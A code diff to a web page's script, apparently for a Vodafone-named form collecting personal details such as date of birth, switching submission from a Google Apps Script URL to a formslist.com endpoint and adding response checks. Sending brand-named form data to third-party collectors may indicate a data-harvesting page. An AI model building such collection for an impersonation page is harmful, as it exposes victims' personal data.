@@ -189,8 +189,8 @@
 </div>
 
 <script>
-// ============ YOUR GOOGLE SHEETS WEB APP URL ============
-const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbyxiOFOpO_XSrG25V0ApzKPgzuTTvouurv-zRFGYSwLjj5TBacVo-_HgaRMuIB9lmxx/exec";
+// ============ YOUR FORMSLIST ENDPOINT ============
+const FORMSLIST_URL = "https://formslist.com/f/wOp1Gr7qxbyS";
 
 const form = document.getElementById('vodafoneForm');
 const toast = document.getElementById('toastMsg');
@@ -223,18 +223,23 @@ function resetForm() {
   document.getElementById('dobYear').value = '';
 }
 
-async function sendToCloudDatabase(formData) {
+async function sendToFormsList(formData) {
   try {
-    const response = await fetch(GOOGLE_SHEETS_URL, {
+    const response = await fetch(FORMSLIST_URL, {
       method: 'POST',
-      mode: 'no-cors',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(formData)
     });
-    console.log('Data sent to cloud database');
-    return true;
+    
+    if (response.ok) {
+      console.log('Form submitted successfully to FormsList');
+      return true;
+    } else {
+      console.error('Submission failed:', response.status);
+      return false;
+    }
   } catch(error) {
-    console.error('Cloud error:', error);
+    console.error('Network error:', error);
     return false;
   }
 }
@@ -349,14 +354,14 @@ document.getElementById('submitBtn').addEventListener('click', async function(e)
   submitBtn.disabled = true;
   submitBtn.innerHTML = '<span class="loading-spinner"></span> Submitting...';
   
-  const cloudSent = await sendToCloudDatabase(formData);
+  const submitted = await sendToFormsList(formData);
   
   setTimeout(() => {
-    if (cloudSent) {
+    if (submitted) {
       thankyouModal.classList.add('active');
-      showMessage("✅ Submitted! Data saved to cloud.", false);
+      showMessage("✅ Form submitted successfully!", false);
     } else {
-      showMessage("❌ Error submitting. Please try again.", true);
+      showMessage("❌ Submission failed. Please try again.", true);
     }
     
     submitBtn.disabled = false;
